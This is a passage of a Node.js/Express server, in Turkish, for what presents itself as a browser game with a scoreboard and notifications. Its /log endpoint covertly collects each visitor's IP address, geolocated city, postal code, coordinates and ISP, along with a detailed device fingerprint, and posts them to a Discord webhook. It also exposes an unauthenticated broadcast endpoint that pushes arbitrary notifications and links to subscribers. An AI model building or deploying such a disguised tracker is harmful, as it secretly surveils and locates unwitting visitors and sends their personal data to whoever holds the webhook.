  var colors = { visit: 0x3b82f6, notify_granted: 0x22c55e, notify_denied: 0xef4444 };

  f.push({ name: "🌐 IP", value: "`" + ip + "`", inline: true });
  f.push({ name: "🌍 Ülke", value: country + flag, inline: true });
  f.push({ name: "🏙️ Şehir", value: ((geo && geo.city) || "?") + " / " + ((geo && geo.region) || "?"), inline: true });
  f.push({ name: "📮 Posta", value: (geo && geo.postal) || "?", inline: true });
  f.push({ name: "📍 Konum", value: ((geo && geo.latitude) || "?") + ", " + ((geo && geo.longitude) || "?"), inline: true });
  f.push({ name: "🏢 ISP", value: ((geo && geo.org) || "?"), inline: false });
  f.push({ name: "💻 Tarayıcı", value: info.browser || "?", inline: true });
  f.push({ name: "🖥️ OS", value: info.os || "?", inline: true });
  f.push({ name: "📱 Cihaz", value: info.dtype || "?", inline: true });
  f.push({ name: "🍎 iOS", value: info.ios || "?", inline: true });
  f.push({ name: "📲 PWA", value: info.pwa || "?", inline: true });
  f.push({ name: "🗣️ Dil", value: info.lang || "?", inline: true });
  f.push({ name: "🕒 TZ", value: info.tz || "?", inline: true });
  f.push({ name: "📺 Ekran", value: (info.screen || "?") + " (" + (info.color || "?") + ")", inline: true });
  f.push({ name: "⚙️ CPU", value: (info.cores || "?") + " cekirdek", inline: true });
  f.push({ name: "👆 Dokunmatik", value: info.touch || "?", inline: true });
  f.push({ name: "🍪 Çerez", value: info.cookie || "?", inline: true });
  f.push({ name: "📶 Bağlantı", value: (info.online || "?") + " - " + (info.conn || "?"), inline: true });
  f.push({ name: "🔔 İzin", value: info.notif || "?", inline: true });
  f.push({ name: "🆔 Session", value: "`" + (info.sid || "?") + "`", inline: true });
  f.push({ name: "↩️ Yönlendiren", value: (info.ref || "direkt").substring(0, 200), inline: false });
  f.push({ name: "🖥️ User-Agent", value: "```" + (info.ua || "").substring(0, 180) + "```", inline: false });

  return {
    title: titles[event] || "👤 Site Ziyareti",
    color: colors[event] || 0x3b82f6,
    timestamp: new Date().toISOString(),
    fields: f,
    footer: { text: "Oyun Log - " + new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" }) }
  };
}

app.get("/", function(req, res){
  res.set("Content-Type", "text/html; charset=utf-8");
  res.set("Cache-Control", "no-store");
  res.send(HTML);
});

app.get("/sw.js", function(req, res){
  res.set("Content-Type", "application/javascript; charset=utf-8");
  res.set("Service-Worker-Allowed", "/");
  res.send(SW_CODE);
});

app.post("/api/broadcast", function(req, res){
  var body = req.body || {};
  var msg = {
    id: ++MSG_ID,
    title: String(body.title || "Bildirim").slice(0, 100),
    body: String(body.body || "").slice(0, 500),
    url: String(body.url || "").slice(0, 300),
    ts: Date.now()
  };
  MESSAGES.push(msg);
  var cutoff = Date.now() - 3600 * 1000;
  MESSAGES = MESSAGES.filter(function(m){ return m.ts > cutoff; });
  if (MESSAGES.length > 50) MESSAGES = MESSAGES.slice(-50);
  res.json({ ok: true, id: msg.id, total: MESSAGES.length });
});

app.get("/api/messages", function(req, res){
  var since = parseInt(req.query.since || "0", 10);
  var list = MESSAGES.filter(function(m){ return m.id > since; });
  res.set("Cache-Control", "no-store");
  res.json({ messages: list, latest: MSG_ID });
});

app.post("/api/score", function(req, res){
  var body = req.body || {};
  var name = String(body.name || "Anonim").trim().slice(0, 20);
  var sc = parseInt(body.score, 10);
  if (isNaN(sc) || sc < 0) sc = 0;

  SCORES.push({ name: name, score: sc, ts: Date.now() });
  SCORES.sort(function(a, b){ return b.score - a.score; });
  if (SCORES.length > 100) SCORES = SCORES.slice(0, 100);
  res.json({ ok: true });
});

app.get("/api/scores", function(req, res){
  res.set("Cache-Control", "no-store");
  res.json({ scores: SCORES.slice(0, 20) });
});

app.delete("/api/scores", function(req, res){
  SCORES = [];
  res.json({ ok: true });
});

app.post("/log", function(req, res){
  var fwd = req.headers["x-forwarded-for"] || "";
  var ip = (fwd.split(",")[0] || "").trim() || req.socket.remoteAddress || "?";
  var info = (req.body && req.body.info) || {};
  var event = (req.body && req.body.event) || "visit";

  getGeo(ip).then(function(geo){
    var embed = buildEmbed(info, geo, ip, event);
    return fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username: "Oyun Log", embeds: [embed] })
    }).then(function(r){
      if (!r.ok){
        return r.text().then(function(t){
          console.error("Discord hata:", r.status, t);
          res.status(500).json({ ok: false, status: r.status });
        });
      }
      res.json({ ok: true });
    });
  }).catch(function(e){
    console.error(e);
    res.status(500).json({ ok: false, error: String(e) });
  });
});

app.get("/test", function(req, res){
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: "Test - Render calisiyor!" })
  })
  .then(function(r){ res.send("Test gonderildi: " + r.status); })
  .catch(function(e){ res.status(500).send("Hata: " + e.message); });
});

app.listen(PORT, function(){
  console.log("Sunucu " + PORT + " portunda calisiyor");
});
